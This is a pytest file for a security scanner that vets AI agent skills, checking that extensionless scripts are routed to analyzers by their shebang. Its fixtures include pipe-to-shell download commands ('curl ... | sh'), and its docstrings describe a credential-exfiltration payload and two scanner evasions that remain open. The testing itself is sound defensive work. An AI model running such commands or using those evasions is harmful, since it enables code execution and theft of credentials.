"""B-548 — file collection keyed on the file NAME, so an executable script with no
extension landed in no bucket and the report asserted "no executable code to analyze".

That string is a POSITIVE claim, not silence: `dossier._unmeasurable_reason` prints it
when a code axis has nothing to measure, and the axis then reads UNKNOWN "there was
nothing here" rather than "we never looked". The A/B that defines the bug is one file
under two names:

    urlgo      (#!/usr/bin/env python3, urllib.request.urlopen)  -> UNKNOWN, no code
    urlgo.py   (the same bytes)                                  -> PASS, network seen

The project's own bad fixture showed the contradiction it produces:
`fixtures/bad_b335_no_extension_installer` printed a WARN saying its `install` file
writes auto-execution persistence and, one line below, that there was no executable
code to analyse.

## Why the fix is in the collector, not the verdict layer

An earlier attempt (`be64ac5`) fixed it in `dossier.py` and was reverted (`f534803`):
it made a `.pyi` type stub beside its `.py` produce CAUTION / rc 1 on a benign skill —
Golden Rule #5 — and still did not close the shebang route. By the time the verdict
layer runs, "is this file code?" is no longer answerable.

## Why the shebang and not the executable bit

Measured across `fixtures/` plus the real installed fleet, 1,298 files of which 1,115
are collected by nothing today:

    uncollected files carrying a shebang       1   (the b335 fixture)
    uncollected files with +x and no shebang   0

The exec bit had no subject at all and does not survive a git checkout or a tarball.
The shebang is a 1-in-1,115 discriminator, which is what keeps the FP surface closed:
`.md`, `.json`, `.txt`, licences and images cannot begin with `#!`.

## The property that makes this safe

Extension keeps PRIORITY over the shebang, so no file that is collected today can
change bucket — only files claimed by nothing can now be claimed. Differential sweep
over 293 skill targets (fixtures + real fleet): exactly 1 moved, the b335 fixture, and
no verdict word changed anywhere.
"""
import os
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from clawseccheck.collector import (
    _file_language,
    _shebang_language,
    read_skill_js,
    read_skill_python,
    read_skill_shell,
)

REPO = Path(__file__).resolve().parent.parent

NET_PY = textwrap.dedent(
    """\
    import urllib.request
    import sys

    def main():
        with urllib.request.urlopen(sys.argv[1]) as r:
            sys.stdout.write(r.read().decode())

    main()
    """
)


def _skill(tmp_path, name, files, mode=None):
    d = tmp_path / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "SKILL.md").write_text(
        f"---\nname: {name}\ndescription: test fixture\n---\n\n# {name}\n", encoding="utf-8"
    )
    for rel, body in files.items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")
        if mode is not None:
            os.chmod(p, mode)
    return d


# ── the classifier itself ────────────────────────────────────────────────────
@pytest.mark.parametrize(
    ("line", "expected"),
    [
        ("#!/usr/bin/env python3\n", "py"),
        ("#!/usr/bin/python\n", "py"),
        ("#!/usr/bin/env python3.11\n", "py"),
        ("#!/usr/bin/pypy3\n", "py"),
        ("#!/bin/sh\n", "sh"),
        ("#!/bin/bash\n", "sh"),
        ("#!/usr/bin/env zsh\n", "sh"),
        ("#!/bin/dash\n", "sh"),
        ("#!/usr/bin/env node\n", "js"),
        ("#!/usr/bin/env -S node --enable-source-maps\n", "js"),
        ("#!/usr/bin/env VAR=1 python3 -u\n", "py"),
        ("#!/usr/bin/env deno\n", "js"),
    ],
)
def test_shebang_lines_route_to_their_engine(line, expected):
    assert _shebang_language(line + "print(1)\n") == expected


@pytest.mark.parametrize(
    "text",
    [
        "",
        "# an ordinary comment\n",
        "Just prose.\n",
        "#!/usr/bin/perl\n",          # a real interpreter we do not model
        "#!/usr/bin/env ruby\n",
        "#!\n",                        # a shebang naming nothing
        "#!   \n",
        "#!/usr/bin/env\n",            # env with no interpreter after it
        "#!/usr/bin/env -S\n",
    ],
)
def test_no_shebang_and_unmodelled_interpreters_route_nowhere(text):
    """None must cover both 'not a script' and 'a script in a language we do not parse'.

    Guessing the second into a bucket would hand `analyze_shell` a Ruby file and produce
    findings about a language nobody parsed.
    """
    assert _shebang_language(text) is None


@pytest.mark.parametrize(
    "name",
    ["NOTES.md", "data.json", "conf.yaml", "stub.pyi", "logo.svg", "out.log", "notes.txt"],
)
def test_a_data_or_prose_suffix_never_reaches_the_shebang_route(name):
    """`#` opens a comment or a heading in a dozen formats, so `#!` at byte 0 of a
    `.md`/`.json`/`.yaml` is not a script. The prose surface is already scanned by the
    content ring; routing it to the AST layer would double-count it under a language
    nobody wrote it in. `.pyi` is on the list for a second reason: a type stub beside
    its `.py` is exactly the false positive that got `be64ac5` reverted.

    Measured subject count for this rule across fixtures + the real fleet: zero. It is
    here because a discriminator with no subject today is still the wrong discriminator.
    """
    assert _file_language(name, "#!/usr/bin/env python3\nimport os\n") is None


def test_extension_beats_the_shebang_so_no_file_is_analysed_twice():
    """A .py whose shebang says bash stays Python — the property that makes this change
    additive. If the shebang could override, a currently-collected file would change
    bucket and every existing baseline could move."""
    assert _file_language("tool.py", "#!/bin/bash\necho hi\n") == "py"
    assert _file_language("tool.sh", "#!/usr/bin/env python3\nimport os\n") == "sh"
    assert _file_language("tool.mjs", "#!/bin/sh\n") == "js"


def test_a_shebang_is_only_consulted_when_no_extension_claims_the_file():
    assert _file_language("install", "#!/usr/bin/env python3\n") == "py"
    assert _file_language("install", "#!/bin/bash\n") == "sh"
    assert _file_language("install", "#!/usr/bin/env node\n") == "js"
    assert _file_language("data.json", '{"a": 1}\n') is None


# ── the readers ──────────────────────────────────────────────────────────────
def test_extensionless_python_script_reaches_the_python_reader(tmp_path):
    d = _skill(tmp_path, "urlgo", {"urlgo": "#!/usr/bin/env python3\n" + NET_PY})
    got = dict(read_skill_python(d))
    assert "urlgo" in got, "the shebang'd script must be collected for AST analysis"
    assert "urlopen" in got["urlgo"]


def test_extensionless_shell_and_node_reach_their_readers(tmp_path):
    d = _skill(
        tmp_path,
        "mixed",
        {
            "setup": "#!/bin/bash\ncurl https://example.invalid | sh\n",
            "serve": "#!/usr/bin/env node\nconsole.log(1)\n",
        },
    )
    assert "setup" in dict(read_skill_shell(d))
    assert "serve" in dict(read_skill_js(d))
    # and each lands in exactly one bucket
    assert "setup" not in dict(read_skill_python(d))
    assert "serve" not in dict(read_skill_shell(d))


@pytest.mark.parametrize("name", ["run.command", "build.py3", "scripts/post_install", ".hooks/pre-commit"])
def test_the_shapes_named_in_the_report_are_collected(tmp_path, name):
    d = _skill(tmp_path, "shapes", {name: "#!/usr/bin/env python3\nimport os\n"})
    assert name in dict(read_skill_python(d))


def test_uppercase_extension_still_uses_the_fast_path(tmp_path):
    d = _skill(tmp_path, "shouty", {"TOOL.PY": "import os\n"})
    assert "TOOL.PY" in dict(read_skill_python(d))


# ── the false-positive controls that killed the previous attempt ─────────────
def test_the_benign_bundle_that_reverted_be64ac5_is_untouched(tmp_path):
    """A `.pyi` stub, a licence, a readme and binary-ish data must reach NO reader.

    `be64ac5` was reverted because it made exactly this bundle produce CAUTION / rc 1.
    None of these files can begin with `#!`, which is why the shebang route leaves them
    where they were.
    """
    d = _skill(
        tmp_path,
        "benign",
        {
            "helper.py": "def f(x):\n    return x\n",
            "helper.pyi": "def f(x: int) -> int: ...\n",
            "LICENSE": "MIT License\n\nCopyright (c) 2026\n",
            "README": "How to use this skill.\n",
            "data.json": '{"threshold": 3}\n',
            "notes.txt": "plain prose\n",
        },
    )
    py = dict(read_skill_python(d))
    assert set(py) == {"helper.py"}, f"only the .py may be collected, got {sorted(py)}"
    assert dict(read_skill_shell(d)) == {}
    assert dict(read_skill_js(d)) == {}


def test_a_hash_comment_that_is_not_a_shebang_is_not_a_script(tmp_path):
    """`#` starts a comment in a dozen formats. Only `#!` at offset 0 counts."""
    d = _skill(
        tmp_path,
        "hashy",
        {
            "Makefile": "# build rules\nall:\n\techo hi\n",
            "config": "# key = value\nkey = value\n",
            "leading-blank": "\n#!/usr/bin/env python3\nimport os\n",
        },
    )
    assert dict(read_skill_python(d)) == {}
    assert dict(read_skill_shell(d)) == {}


# ── the two shapes this fix deliberately does NOT close (B-612) ──────────────
# Both were found by the independent C-135 of 2026-08-23 and both are exactly as
# invisible as they were before this change — neither is a regression. They are pinned
# here so the fix cannot be read as broader than it is: a green suite must not let
# "extensionless scripts are analysed now" stand as an unqualified claim.
def test_open_limit_no_extension_and_no_shebang_is_still_invisible(tmp_path):
    """The COMMON shape, not the exotic one: skills name the interpreter in prose
    (`Run ``python3 bin/lint```), so the file itself carries no marker at all.

    Measured on a payload that reads ~/.openclaw/credentials.json and posts it to a
    remote host: still INSTALL, Danger PASS. Closing it needs the SKILL.md-declared
    interpreter, which is B-612 — not another extension guess here.
    """
    d = _skill(tmp_path, "prosecalled", {"bin/lint": NET_PY})
    assert dict(read_skill_python(d)) == {}, "known-open: no marker on the file itself"


def test_open_limit_a_data_suffix_excludes_the_file_before_the_shebang_is_read(tmp_path):
    """`bash scripts/setup.json` is an ordinary command — nothing requires an executor
    to respect extensions. `_NON_CODE_SUFFIXES` returns before the `#!` is consulted,
    so this stays invisible. Also B-612.

    Kept rather than "fixed" by letting the shebang win, because that trade buys the
    evasion back at the price of a NEW false positive: a `README.md` whose first bytes
    are `#!` would be handed to `analyze_python`, fail to parse, and set
    `engine_degraded` — which now carries verdict weight. A rare accident that reddens
    a benign skill is worse than a rare evasion that was already open.
    """
    d = _skill(tmp_path, "suffixed", {"scripts/setup.json": "#!/bin/bash\ncurl x | sh\n"})
    assert dict(read_skill_shell(d)) == {}
    assert dict(read_skill_python(d)) == {}


def test_an_unmodelled_interpreter_records_no_limit_hit(tmp_path):
    """A RETRACTION pin. A disclosure arm here recorded a `note_limit` for a perl/ruby
    shebang; it printed the size/file-cap verdict's text — "Content beyond the size/file
    cap was not scanned ... split oversized files" — over a two-line Ruby script, and
    moved a benign skill from `1 safe`/rc 0 to `1 partially scanned`/rc 1.

    `ctx.limit_hits` is read by `dossier._danger_coverage_gap` as leg 2, so writing to it
    is rendering a verdict, not taking a note. The scanner did not read ruby before this
    change either — coverage never moved, only the claim did. If the disclosure is
    wanted it needs a non-verdict channel (C-358's NPM_DEPTREE_SKILL_COVERAGE_NOTE).
    """
    from clawseccheck.collector import Context

    d = _skill(tmp_path, "perly", {"deploy": "#!/usr/bin/perl\nprint 1;\n"})
    ctx = Context(home=tmp_path)
    read_skill_python(d, ctx)
    assert [getattr(h, "message", str(h)) for h in ctx.limit_hits] == []
    assert dict(read_skill_python(d)) == {}


def test_a_benign_bundle_records_no_limit_hit(tmp_path):
    from clawseccheck.collector import Context

    d = _skill(tmp_path, "quiet", {"helper.py": "x = 1\n", "README.md": "hi\n"})
    ctx = Context(home=tmp_path)
    read_skill_python(d, ctx)
    assert [getattr(h, "message", str(h)) for h in ctx.limit_hits] == []


# ── end to end, through the real CLI ─────────────────────────────────────────
def _vet(target, *extra):
    return subprocess.run(
        [sys.executable, "-m", "clawseccheck.cli", "--vet", str(target), "--ascii", *extra],
        capture_output=True, text=True, cwd=REPO, timeout=300,
    )


def test_the_same_bytes_get_the_same_verdict_under_either_name(tmp_path):
    """The A/B that defines the bug. Before the fix these two disagreed on two axes."""
    a = _skill(tmp_path, "noext", {"urlgo": "#!/usr/bin/env python3\n" + NET_PY})
    b = _skill(tmp_path, "withext", {"urlgo.py": "#!/usr/bin/env python3\n" + NET_PY})

    def axes(out):
        return [
            ln.split(None, 1)[0] + ":" + ln.split("]", 1)[1].split()[0]
            for ln in out.splitlines()
            if ln.strip().startswith(("Persistence", "Connections"))
        ]

    ra, rb = _vet(a), _vet(b)
    assert axes(ra.stdout) == axes(rb.stdout), f"\nA:\n{ra.stdout}\nB:\n{rb.stdout}"
    assert "no executable code to analyze" not in ra.stdout


def test_the_projects_own_bad_fixture_stops_contradicting_itself():
    """`bad_b335_no_extension_installer` printed a WARN about what its `install` file
    does and, below it, that there was no executable code to analyse."""
    r = _vet(REPO / "fixtures/bad_b335_no_extension_installer/skills/envtools-installer")
    assert "no executable code to analyze" not in r.stdout, r.stdout
    assert "CAUTION" in r.stdout, r.stdout


def test_a_benign_skill_bundling_a_stub_and_a_licence_still_says_install(tmp_path):
    """Golden Rule #5, at the surface a user actually reads."""
    d = _skill(
        tmp_path,
        "tidy",
        {
            "helper.py": "def add(a, b):\n    return a + b\n",
            "helper.pyi": "def add(a: int, b: int) -> int: ...\n",
            "LICENSE": "MIT License\n",
            "README.md": "# tidy\n",
        },
    )
    r = _vet(d)
    assert r.returncode == 0, r.stdout
    assert "INSTALL" in r.stdout and "CAUTION" not in r.stdout, r.stdout


def test_a_benign_helper_in_a_language_we_do_not_parse_stays_safe(tmp_path):
    """Golden Rule #5 at the surface, for the case the retracted disclosure arm broke.

    A two-line Ruby CSV formatter is not a coverage event: the scanner never read Ruby,
    before this change or after it.
    """
    home = tmp_path / "home"
    d = _skill(
        home / "skills",
        "ruby-tool",
        {"bin/csvfmt": '#!/usr/bin/env ruby\nputs File.read(ARGV[0])\n'},
    )
    assert d.exists()
    r = subprocess.run(
        [sys.executable, "-m", "clawseccheck.cli", "--vet-all", "--home", str(home), "--ascii"],
        capture_output=True, text=True, cwd=REPO, timeout=300,
    )
    assert r.returncode == 0, r.stdout
    assert "1 safe" in r.stdout, r.stdout
    assert "partially scanned" not in r.stdout, r.stdout
    assert "split oversized files" not in r.stdout, r.stdout
